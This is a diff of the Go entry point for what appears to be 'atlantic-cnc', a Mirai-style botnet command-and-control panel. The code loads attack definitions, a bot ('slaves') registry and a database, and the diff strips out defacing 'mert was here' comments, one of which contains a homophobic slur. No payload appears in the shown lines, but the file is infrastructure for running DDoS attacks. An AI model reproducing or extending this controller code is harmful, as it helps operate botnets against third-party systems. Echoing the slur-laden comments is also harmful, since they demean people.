@@ -1,7 +1,7 @@
 package main
 
 import (
-//        "os" mert was here
+//        "os"
 	"fmt"
 	"log"
 	"strconv"
@@ -17,7 +17,7 @@ import (
 	"atlantic-cnc/core/models/external"
         "atlantic-cnc/core/slaves/transition"
 
-//        License "atlantic-cnc/core/models/license" (mert was here)
+//        License "atlantic-cnc/core/models/license"
         slaves "atlantic-cnc/core/slaves/mirai"
 )
 
@@ -34,7 +34,7 @@ func main() {
 //        check := License.LicenseGet()
 //        if !check {
 //                os.Exit(1)
-//        } //yall mert was here
+//        }
 
 	error := build.NewParse_config_json()
 	if error != nil {
@@ -49,10 +49,10 @@ func main() {
 
 	_, error = build.LoadAttacks()
 	if error != nil {
-//		log.Println("[JSON Fatal] [guys mert was here also, Failed to correctly parse `" + versions.GOOS_Edition.Make["API_Attack"] + "`] [" + error.Error() + "]")
+		log.Println("[JSON Fatal] [Failed to correctly parse `" + versions.GOOS_Edition.Make["API_Attack"] + "`] [" + error.Error() + "]")
 		return
 	} else {
-//		log.Println("[JSON Correct] [Correctly parsed your `" + versions.GOOS_Edition.Make["API_Attack"] + "`]")
+		log.Println("[JSON Correct] [Correctly parsed your `" + versions.GOOS_Edition.Make["API_Attack"] + "`]")
 	}
 
         error = build.NewParse_Attack_Json()
@@ -85,7 +85,7 @@ func main() {
 		log.Println("[JSON Fatal] [Failed to correctly parse `" + versions.GOOS_Edition.Make["Themes"] + "`] [" + "unknown error appeared" + "]")
 		return
 	} else {
-		log.Println("[JSON Correct] [Correctly parsed your `" + versions.GOOS_Edition.Make["Themes"] + "`]") // mert runs you fags
+		log.Println("[JSON Correct] [Correctly parsed your `" + versions.GOOS_Edition.Make["Themes"] + "`]")
 	}
 
         _, error = build.LoadSlaves()
@@ -109,7 +109,6 @@ func main() {
 		log.Println("[SQL Fatal] [Failed to correctly open to `" + build.Config.Database.Sql_host + "`] [" + error.Error() + "]")
 		return
 	}
-	// guys mert.#1338 hacked the planet add me for free rubux from builderman....
 	error = database.Database.Ping()
 	if error != nil {
 		log.Println("[SQL Fatal] [Failed to correctly connect to `" + build.Config.Database.Sql_host + "`] [" + error.Error() + "]")
